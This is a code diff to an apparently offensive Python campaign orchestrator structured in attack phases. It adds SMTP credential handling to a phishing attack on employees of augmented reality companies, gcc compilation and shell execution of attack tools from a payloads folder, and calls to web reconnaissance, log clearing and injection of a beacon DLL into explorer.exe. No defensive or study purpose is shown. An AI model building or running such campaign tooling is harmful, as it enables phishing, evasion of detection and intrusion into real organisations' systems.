@@ -22,10 +22,29 @@ def run_tool(tool_name, args=""):
         tool_path = os.path.join(os.path.dirname(__file__), "..", "..", "tools", tool_name)
 
     if not os.path.exists(tool_path):
+        # If tool is not in campaign's tool directory, try payloads directory
+        tool_path = os.path.join(os.path.dirname(__file__), "payloads", tool_name)
+
+    if not os.path.exists(tool_path):
         print(f"[-] Tool {tool_name} not found.")
         return
 
-    print(f"[*] Running tool: {tool_name}...")
+    if tool_path.endswith(".c"):
+        # Compile C code
+        output_path = tool_path.replace(".c", "")
+        compile_command = f"gcc {tool_path} -o {output_path}"
+        print(f"[*] Compiling C code: {compile_command}...")
+        try:
+            subprocess.run(compile_command, shell=True, check=True)
+            tool_path = output_path
+        except subprocess.CalledProcessError as e:
+            print(f"[-] Error compiling C code: {e}")
+            return
+        except FileNotFoundError:
+            print(f"[-] gcc not found. Please install gcc.")
+            return
+
+    print(f"[*] Running tool: {tool_path} {args}...")
     try:
         subprocess.run(f"{tool_path} {args}", shell=True, check=True)
     except subprocess.CalledProcessError as e:
@@ -35,6 +54,8 @@ def run_tool(tool_name, args=""):
 
 
 def main():
+    with open("config.json") as f:
+        config = json.load(f)
     """
     Main function to run the augmented_reality_campaign campaign.
     """
@@ -42,7 +63,13 @@ def main():
 
     # 1. Initial Access
     print("[*] Phase 1: Initial Access")
-    initial_access.phishing_attack("augmented_reality_companies_employees.txt")
+    smtp_config = {
+        "server": config.get("smtp_server"),
+        "port": config.get("smtp_port"),
+        "user": config.get("smtp_user"),
+        "password": config.get("smtp_password"),
+    }
+    initial_access.phishing_attack("augmented_reality_companies_employees.txt", smtp_config)
     run_tool("apt_web_recon.js", "--target augmented_reality_companies.com")
 
 
@@ -59,7 +86,7 @@ def main():
     # 4. Defense Evasion
     print("\n[*] Phase 4: Defense Evasion")
     defense_evasion.clear_logs()
-    run_tool("apt_memory_injector.c", "--process explorer.exe --payload payloads/beacon.dll")
+    run_tool("apt_memory_injector.py", "--process explorer.exe --payload payloads/beacon.dll")
 
 
     # 5. Command and Control
